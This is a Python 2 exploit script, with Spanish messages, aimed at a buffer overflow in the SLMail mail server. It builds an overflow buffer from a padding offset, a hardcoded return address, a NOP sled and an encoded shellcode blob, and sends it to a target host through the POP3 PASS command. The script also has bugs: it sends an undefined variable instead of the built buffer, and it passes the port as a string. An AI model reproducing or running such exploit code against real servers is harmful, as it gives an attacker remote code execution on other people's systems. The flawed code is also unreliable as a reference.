#!/usr/bin/python
# coding: utf-8

import socket, signal, signal, time, pdb, pwn, sys
import socket as so

def def_handler(sig, frame):
    print "\n\n [¡] Saliendo...\n"
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)



if len(sys.argv) <3:
  print "\n [¡]Uso: python " + sys.argv[0] + " <dirección-ip><puerto>\n"
  sys.exit(1)


ipAddress = sys.argv[1]
port = sys.argv[2]

if __name__ == '__main__':

    offset = "A" * 2606
    NOPs = "\x90" * 20
    shellcode = ("\xb8\xbb\x39\x16\x1c\xdb\xdc\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xc3\x04\x31\x43\x0e\x03\xf8\x37\xf4\xe9\x02\xaf\x7a"
"\x11\xfa\x30\x1b\x9b\x1f\x01\x1b\xff\x54\x32\xab\x8b\x38\xbf"
"\x40\xd9\xa8\x34\x24\xf6\xdf\xfd\x83\x20\xee\xfe\xb8\x11\x71"
"\x7d\xc3\x45\x51\xbc\x0c\x98\x90\xf9\x71\x51\xc0\x52\xfd\xc4"
"\xf4\xd7\x4b\xd5\x7f\xab\x5a\x5d\x9c\x7c\x5c\x4c\x33\xf6\x07"
"\x4e\xb2\xdb\x33\xc7\xac\x38\x79\x91\x47\x8a\xf5\x20\x81\xc2"
"\xf6\x8f\xec\xea\x04\xd1\x29\xcc\xf6\xa4\x43\x2e\x8a\xbe\x90"
"\x4c\x50\x4a\x02\xf6\x13\xec\xee\x06\xf7\x6b\x65\x04\xbc\xf8"
"\x21\x09\x43\x2c\x5a\x35\xc8\xd3\x8c\xbf\x8a\xf7\x08\x9b\x49"
"\x99\x09\x41\x3f\xa6\x49\x2a\xe0\x02\x02\xc7\xf5\x3e\x49\x80"
"\x3a\x73\x71\x50\x55\x04\x02\x62\xfa\xbe\x8c\xce\x73\x19\x4b"
"\x30\xae\xdd\xc3\xcf\x51\x1e\xca\x0b\x05\x4e\x64\xbd\x26\x05"
"\x74\x42\xf3\x8a\x24\xec\xac\x6a\x94\x4c\x1d\x03\xfe\x42\x42"
"\x33\x01\x89\xeb\xde\xf8\x5a\xd4\xb7\x02\x9c\xbc\xc5\x02\xa3"
"\x87\x43\xe4\xc9\xe7\x05\xbf\x65\x91\x0f\x4b\x17\x5e\x9a\x36"
"\x17\xd4\x29\xc7\xd6\x1d\x47\xdb\x8f\xed\x12\x81\x06\xf1\x88"
"\xad\xc5\x60\x57\x2d\x83\x98\xc0\x7a\xc4\x6f\x19\xee\xf8\xd6"
"\xb3\x0c\x01\x8e\xfc\x94\xde\x73\x02\x15\x92\xc8\x20\x05\x6a"
"\xd0\x6c\x71\x22\x87\x3a\x2f\x84\x71\x8d\x99\x5e\x2d\x47\x4d"
"\x26\x1d\x58\x0b\x27\x48\x2e\xf3\x96\x25\x77\x0c\x16\xa2\x7f"
"\x75\x4a\x52\x7f\xac\xce\x72\x62\x64\x3b\x1b\x3b\xed\x86\x46"
"\xbc\xd8\xc5\x7e\x3f\xe8\xb5\x84\x5f\x99\xb0\xc1\xe7\x72\xc9"
"\x5a\x82\x74\x7e\x5a\x87")


    buffer = offset + "\x8f\x35\x4a\x5f" + NOPs + shellcode

    s = so.socket(so.AF_INET, so.SOCK_STREAM)
    print "\n[+] Attempting to exploit Slmail sever at %s with Buffer Overflow"%sys.argv[1]
    try:
        s.connect((ipAddress,port))
        s.recv(1024)
        s.send('USER stormworm' +'\r\n')
        s.recv(1024)
        s.send('PASS ' + exploit + '\r\n')
        print "[+] Exploited."
    except:
        print "[+] Unable to connect to Slmail server at %s" %sys.argv[1]
        sys.exit()
